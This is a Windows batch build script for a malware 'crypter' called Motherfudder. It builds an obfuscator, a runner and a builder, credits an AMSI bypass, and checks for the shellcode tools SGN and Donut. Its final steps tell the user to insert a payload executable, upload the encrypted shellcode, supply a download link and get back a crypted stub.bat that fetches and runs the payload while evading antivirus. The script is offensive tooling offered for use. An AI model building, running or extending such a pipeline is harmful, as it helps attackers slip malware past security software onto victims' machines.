@echo off
REM ==========================================
REM Motherfudder Crypter - Automated Build Script
REM ==========================================
REM This script automates the entire build and crypting process
REM Credit: GlobalAMSIBypass implementation by Chainski (https://github.com/Chainski/GlobalAMSIBypass)
REM ==========================================

setlocal enabledelayedexpansion
color 0A

echo.
echo ========================================
echo  Motherfudder Automated Crypter
echo ========================================
echo.

REM Check if running from workspace root
if not exist "MfBuilder" (
    echo [ERROR] MfBuilder directory not found!
    echo Please run this script from the workspace root directory.
    pause
    exit /b 1
)

if not exist "MfObfDotNet" (
    echo [ERROR] MfObfDotNet directory not found!
    pause
    exit /b 1
)

echo [+] Step 1: Checking prerequisites...
echo.

REM Check for MSBuild (Visual Studio)
where msbuild >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] MSBuild not found! Please ensure Visual Studio with .NET Framework 4.8 is installed.
    echo.
    echo You may need to run this from a Visual Studio Developer Command Prompt.
    echo Or add MSBuild to your PATH.
    pause
    exit /b 1
)
echo [OK] MSBuild found

REM Check for Cargo (Rust)
where cargo >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Cargo (Rust) not found! Please install Rust from https://rustup.rs/
    pause
    exit /b 1
)
echo [OK] Cargo found

echo.
echo [+] Step 2: Building MfObfDotNet...
echo.

cd MfObfDotNet
msbuild MfObfDotNet.sln /p:Configuration=Release /p:Platform="Any CPU" /v:minimal
if %errorlevel% neq 0 (
    echo [ERROR] Failed to build MfObfDotNet
    cd ..
    pause
    exit /b 1
)
cd ..
echo [OK] MfObfDotNet built successfully

echo.
echo [+] Step 3: Building MfRunner...
echo.

cd MfBuilder\MfRunner
msbuild MfRunner.sln /p:Configuration=Release /p:Platform=x64 /v:minimal
if %errorlevel% neq 0 (
    echo [ERROR] Failed to build MfRunner (x64)
    cd ..\..
    pause
    exit /b 1
)

msbuild MfRunner.sln /p:Configuration=Release /p:Platform=x86 /v:minimal
if %errorlevel% neq 0 (
    echo [ERROR] Failed to build MfRunner (x86)
    cd ..\..
    pause
    exit /b 1
)
cd ..\..
echo [OK] MfRunner built successfully (x64 and x86)

echo.
echo [+] Step 4: Building MfBuilder (Rust)...
echo.

cd MfBuilder
cargo build --release
if %errorlevel% neq 0 (
    echo [ERROR] Failed to build MfBuilder
    cd ..
    pause
    exit /b 1
)
cd ..
echo [OK] MfBuilder built successfully

echo.
echo [+] Step 5: Setting up crypting environment...
echo.

REM Create output directory if it doesn't exist
if not exist "output" mkdir output
cd output

REM Copy required files
echo [*] Copying required files...

REM Copy MfBuilder executable
copy "..\MfBuilder\target\release\MfBuilder.exe" . >nul 2>&1
if %errorlevel% neq 0 (
    echo [WARNING] Could not copy MfBuilder.exe
)

REM Copy build.json config
copy "..\MfBuilder\build.json" . >nul 2>&1
if %errorlevel% neq 0 (
    echo [WARNING] Could not copy build.json
)

REM Copy MfObfDotNet.exe
if exist "..\MfObfDotNet\bin\Release\MfObfDotNet.exe" (
    copy "..\MfObfDotNet\bin\Release\MfObfDotNet.exe" . >nul 2>&1
    echo [OK] Copied MfObfDotNet.exe
) else if exist "..\MfObfDotNet\bin\Any CPU\Release\MfObfDotNet.exe" (
    copy "..\MfObfDotNet\bin\Any CPU\Release\MfObfDotNet.exe" . >nul 2>&1
    echo [OK] Copied MfObfDotNet.exe
) else (
    echo [WARNING] Could not find MfObfDotNet.exe
)

REM Copy MfRunner.exe (x64)
if exist "..\MfBuilder\MfRunner\bin\x64\Release\MfRunner.exe" (
    copy "..\MfBuilder\MfRunner\bin\x64\Release\MfRunner.exe" . >nul 2>&1
    echo [OK] Copied MfRunner.exe
) else (
    echo [WARNING] Could not find MfRunner.exe
)

REM Check for external dependencies (SGN, Donut)
echo.
echo [*] Checking for external dependencies...
if not exist "sgn.exe" (
    echo [WARNING] sgn.exe not found - required for native payloads
    echo Download from: https://github.com/EgeBalci/sgn
)
if not exist "donut.exe" (
    echo [WARNING] donut.exe not found - required for native payloads
    echo Download from: https://github.com/TheWover/donut
)
if not exist "keystone.dll" (
    echo [WARNING] keystone.dll not found - part of SGN, required for native payloads
)

echo.
echo ========================================
echo  Build Complete!
echo ========================================
echo.
echo Your crypting environment is ready in the 'output' directory.
echo.
echo Next steps:
echo 1. Place your payload.exe in the output directory
echo 2. (Optional) Edit build.json to configure protection features
echo 3. Run MfBuilder.exe
echo 4. Upload encrypted shellcode when prompted
echo 5. Paste the download link
echo 6. Your crypted stub.bat will be generated
echo.
echo For native payloads, ensure sgn.exe, donut.exe, and keystone.dll are in the output directory.
echo.

cd ..

echo Press any key to open the output directory...
pause >nul
explorer output

echo.
echo [+] Done!
echo.
pause
